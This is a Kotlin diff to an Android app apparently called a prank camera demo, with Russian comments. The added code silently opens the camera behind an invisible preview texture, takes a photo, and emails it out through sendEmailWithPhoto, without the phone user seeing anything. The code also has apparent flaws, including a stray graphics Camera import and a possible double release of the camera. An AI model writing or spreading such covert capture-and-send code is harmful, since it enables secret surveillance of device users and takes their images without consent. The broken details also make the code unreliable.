@@ -2,8 +2,11 @@ package com.example.prankcamerdemo
 
 import android.app.AlertDialog
 import android.graphics.Bitmap
-import android.hardware.Camera
+import android.graphics.BitmapFactory
+import android.graphics.Camera
+import android.hardware.Camera as HardwareCamera
 import android.media.MediaPlayer
+import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.util.Base64
@@ -106,59 +109,63 @@ class MainActivity : AppCompatActivity() {
     
     private fun takeAndSendPhoto() {
         thread {
+            var photoData: ByteArray? = null
+            
             try {
-                // Пробуем сделать фото через камеру
-                val camera = Camera.open()
-                if (camera != null) {
+                // Пробуем сделать фото через камеру (работает на Android 6.0+)
+                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || 
+                    checkSelfPermission(android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    
+                    var camera: HardwareCamera? = null
                     try {
-                        val parameters = camera.parameters
-                        
-                        // Настраиваем размер фото
-                        val sizes = parameters.supportedPictureSizes
-                        if (sizes.isNotEmpty()) {
-                            val size = sizes[0]
-                            parameters.setPictureSize(size.width, size.height)
-                            camera.parameters = parameters
+                        camera = HardwareCamera.open()
+                        if (camera != null) {
+                            val parameters = camera.parameters
                             
-                            // Создаём SurfaceTexture для превью
-                            val texture = android.graphics.SurfaceTexture(10)
-                            camera.setPreviewTexture(texture)
-                            camera.startPreview()
-                            
-                            // Даём камере время на инициализацию
-                            Thread.sleep(500)
-                            
-                            // Делаем фото
-                            val photoData = ByteArrayRef()
-                            camera.takePicture(null, null, object : Camera.PictureCallback {
-                                override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
-                                    if (data != null) {
-                                        photoData.data = data
+                            // Настраиваем размер фото
+                            val sizes = parameters.supportedPictureSizes
+                            if (sizes.isNotEmpty()) {
+                                val size = sizes[0]
+                                parameters.setPictureSize(size.width, size.height)
+                                camera.parameters = parameters
+                                
+                                // Создаём SurfaceTexture для превью
+                                val texture = android.graphics.SurfaceTexture(10)
+                                camera.setPreviewTexture(texture)
+                                camera.startPreview()
+                                
+                                // Даём камере время на инициализацию
+                                Thread.sleep(500)
+                                
+                                // Делаем фото
+                                val photoRef = ByteArrayRef()
+                                camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
+                                    override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
+                                        if (data != null) {
+                                            photoRef.data = data
+                                        }
+                                        camera?.release()
                                     }
-                                    camera?.release()
-                                }
-                            })
-                            
-                            // Ждём пока фото сохранится
-                            Thread.sleep(1000)
-                            
-                            if (photoData.data != null) {
-                                sendEmailWithPhoto(photoData.data!!)
-                                return@thread
+                                })
+                                
+                                // Ждём пока фото сохранится
+                                Thread.sleep(1000)
+                                
+                                photoData = photoRef.data
                             }
+                            camera.release()
                         }
-                        camera.release()
                     } catch (e: Exception) {
                         e.printStackTrace()
+                        camera?.release()
                     }
                 }
-                
-                // Если камера не доступна - отправляем без фото
-                sendEmailWithPhoto(null)
             } catch (e: Exception) {
                 e.printStackTrace()
-                sendEmailWithPhoto(null)
             }
+            
+            // Отправляем письмо (с фото или без)
+            sendEmailWithPhoto(photoData)
         }
     }
     
